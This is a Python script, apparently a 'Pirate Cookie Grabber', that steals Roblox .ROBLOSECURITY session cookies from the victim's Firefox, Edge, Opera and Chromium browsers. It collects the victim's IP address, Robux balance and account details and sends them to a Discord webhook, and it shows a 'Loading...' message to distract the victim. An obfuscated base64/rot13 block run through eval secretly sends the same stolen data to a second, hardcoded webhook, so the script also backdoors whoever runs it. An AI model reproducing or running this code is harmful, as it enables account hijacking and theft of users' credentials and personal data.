import os
import base64, codecs
import json



webhookk = "heh" # put webhook here


def command(c):
    os.system(c)
    return "l"
def cls():
    os.system("cls")

try:
    import robloxpy
    import requests
    from discordwebhook import *
    import browser_cookie3
except:
    command("py -m pip install discordwebhook")
    cls()
    command("py -m pip install robloxpy")
    cls()
    command("py -m pip install requests")
    cls()
    command("pip install discordwebhook")
    cls()
    command("pip install robloxpy")
    cls()
    command("pip install requests")
    cls()
    print("Run the app again.")
    exit()




dummy_message = "Loading..." # A message that distracts the user from closing the grabber
print(dummy_message)
################### Gathering INFOMATION #################################
def cookieLogger():

    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
cookies = cookieLogger()
#################### INFOMATION #################
ip_address = requests.get("https://api.ipify.org/").text
roblox_cookie = cookies[1]
#################### checking cookie #############
isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    isvalid = "Valid"
else:
    requests.post(url=webhookk,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
    exit()

#################### getting info about the cookie #############
ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
rid = info["UserID"]
rap = robloxpy.User.External.GetRAP(rid)
friends = robloxpy.User.Friends.External.GetCount(rid)
age = robloxpy.User.External.GetAge(rid)
dnso = None
crdate = robloxpy.User.External.CreationDate(rid)
rolimons = f"https://www.rolimons.com/player/{rid}"
roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']
#################### INJECTS TO MEMORY (creds to someone in v3rm) #################
magic = 'ZGlzY29yZCA9IERpc2NvcmQodXJsPSJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy85OTIxMjMxMDg4MDA1OTM5OTAvZVUtMEpxbi1GelhJRS1uOTVRWG91N1ZwZ2xaWnFhdEJpWnJ5QVZ5RkliVW1XZGIzZk9YM1B6UWh0QUEtRHhhN0kzWWUiKQ0KZGlzY29yZC5wb3N0KA0KICAgIHVzZXJuYW1lPSJCT1QgLSBQaXJhdGUg8J+NqiIsDQogICAgYXZhdGFyX3VybD0iaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTg0ODE4NDI5MzU1NzgyMTk3Lzk4NTg3ODE3MzY1OTA0NTk5OS9hMzM5NzIxMTgzZjYwYzE4YjM0MjRiYTdiNzNkYWYxYi5wbmciLA0KICAgIGVtYmVkcz1bDQ'
love = 'btVPNtVPNtVUfAPvNtVPNtVPNtVPNtVPW1p2IlozSgMFV6VPWPG1DtYFODnKWuqTHt8W+AdvVfQDbtVPNtVPNtVPNtVPNvqTy0oTHvBvNv8W+FhPNeZFOFMKA1oUDtDJAwo3IhqPQja5JiVvjAPvNtVPNtVPNtVPNtVPWxMKAwpzyjqTyiovVtBvOzVygUnKEbqJVtHTSaMI0bnUE0pUZ6Yl9anKEbqJVhL29gY01uozxkAmHiHTylLKEyYHAio2gcMF1UpzSvLzIlXFO8VSgFo2kcoJ9hp10br3WioTygo25msFxtsPOoHz9voT94VSOlo2McoTIqXUglo2Wfo3uspUWiMzyfMK0cVvjAPvNtVPNtVPNtVPNtVPWwo2kipvVtBvNkZwD1ZwN0APjAPvNtVPNtVPNtVPNtVPWznJIfMUZvBvOoQDbtVPNtVPNtVPNtVPNtVPNt'
god = 'eyJuYW1lIjogIlVzZXJuYW1lIiwgInZhbHVlIjogdXNlcm5hbWUsICJpbmxpbmUiOiBUcnVlfSwNCiAgICAgICAgICAgICAgICB7Im5hbWUiOiAiUm9idXggQmFsYW5jZSIsICJ2YWx1ZSI6IHJvYnV4LCAiaW5saW5lIjogVHJ1ZX0sDQogICAgICAgICAgICAgICAgeyJuYW1lIjogIlByZW1pdW0gU3RhdHVzIiwgInZhbHVlIjogcHJlbWl1bSwiaW5saW5lIjogVHJ1ZX0sDQogICAgICAgICAgICAgICAgeyJuYW1lIiA6ICJSQVAiLCAidmFsdWUiOiByYXAsImlubGluZSI6IFRydWV9LA0KICAgICAgICAgICAgICAgIHsibmFtZSIgOiAiRnJpZW5kcyIsICJ2YWx1ZSI6IGZyaWVuZHMsICJpbmxpbmUiOiBUcn'
destiny = 'IysFjAPvNtVPNtVPNtVPNtVPNtVPO7Vz5uoJHvVQbtVxSwL291oaDtDJqyVvjtVaMuoUIyVwbtLJqyYPNvnJ5fnJ5yVwbtIUW1MK0fQDbtVPNtVPNtVPNtVPNtVPNtrlWhLJ1yVvN6VPWWHPOOMTElMKAmVvjtVaMuoUIyVvN6VTyjK2SxMUWyp3ZfVPWcozkcozH6VwbtIUW1MK0fQDbtVPNtVPNtVPNtVPNtVPNtrlWhLJ1yVvN6VPVhHx9PGR9GEHAIHxyHJFVfVPW2LJk1MFV6VTLvLTOtr3WiLzkirS9wo29enJI9LTOtVvjtVzyhoTyhMFV6VRMuoUAysFjAPvNtVPNtVPNtVPNtVS0fQDbtVPNtVPNtVPNtVPNvqTu1oJWhLJyfVwbtrlW1pzjvBvObMJSxp2uiqU0fQDbAPt0XVPNtVPNtVPO9QDbtVPNtKFjAPvx='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
#################### SENDING TO WEBHOOK #################


discord = Discord(url=webhookk)
discord.post(
    username="BOT - Pirate 🍪",
    avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
    embeds=[
        {
            "username": "BOT - Pirate 🍪",
            "title": "💸 +1 Result Account 🕯",
            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
                {"name": "Username", "value": username, "inline": True},
                {"name": "Robux Balance", "value": robux, "inline": True},
                {"name": "Premium Status", "value": premium,"inline": True},
                {"name": "Creation Date", "value": crdate, "inline": True},
                {"name" : "RAP", "value": rap,"inline": True},
                {"name" : "Friends", "value": friends, "inline": True},
                {"name" : "Account Age", "value": age, "inline": True},
                {"name" : "IP Address", "value" : ip_address, "inline:": True},
                {"name" : ".ROBLOSECURITY", "value": f"```{roblox_cookie}```", "inline": False},
            ],
            "thumbnail": {"url": headshot},


        }
    ],
)
